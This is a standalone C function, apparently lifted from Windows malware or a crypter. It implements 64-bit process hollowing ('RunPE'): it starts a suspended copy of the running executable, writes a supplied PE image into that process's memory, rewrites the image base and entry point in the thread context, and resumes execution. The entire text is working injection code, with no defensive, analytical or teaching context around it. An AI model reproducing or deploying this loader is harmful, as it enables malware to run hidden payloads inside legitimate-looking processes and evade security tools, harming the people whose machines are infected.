    int RunPortableExecutable(void* Image)
    {
    	IMAGE_DOS_HEADER* DOSHeader;
    	IMAGE_NT_HEADERS64* NtHeader;
    	IMAGE_SECTION_HEADER* SectionHeader;
     
    	PROCESS_INFORMATION PI;
    	STARTUPINFOA SI;
     
    	CONTEXT CTX;
     
    	DWORD64 ImageBase;
    	void* pImageBase;
     
    	int count;
    	char CurrentFilePath[1024];
     
    	DOSHeader = (IMAGE_DOS_HEADER*)Image;
    	NtHeader = (IMAGE_NT_HEADERS64*)((DWORD64)Image + DOSHeader->e_lfanew);
     
    	GetModuleFileNameA(0, CurrentFilePath, 1024);
     
    	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
    	{
    		ZeroMemory(&PI, sizeof(PI));
    		ZeroMemory(&SI, sizeof(SI));
    		SI.cb = sizeof(SI);
     
    		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
    		{
    			CTX.ContextFlags = CONTEXT_FULL;
     
    			if (GetThreadContext(PI.hThread, &CTX))
    			{
    				ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX.Rdx + 16), &ImageBase, sizeof(ImageBase), NULL);
     
    				pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)NtHeader->OptionalHeader.ImageBase,
    					NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
    				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
     
    				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
    				{
    					SectionHeader = (IMAGE_SECTION_HEADER*)((DWORD64)Image + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (count * sizeof(IMAGE_SECTION_HEADER)));
     
    					WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD64)pImageBase + SectionHeader->VirtualAddress),
    						(LPVOID)((DWORD64)Image + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
    				}
    				WriteProcessMemory(PI.hProcess, (LPVOID)(CTX.Rdx + 16),
    					&NtHeader->OptionalHeader.ImageBase, sizeof(NtHeader->OptionalHeader.ImageBase), NULL);
     
    				CTX.Rcx = (DWORD64)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
    				SetThreadContext(PI.hThread, &CTX);
    				ResumeThread(PI.hThread);
     
    				return 0;
    			}
    		}
    	}
     
    	return -1;
    }
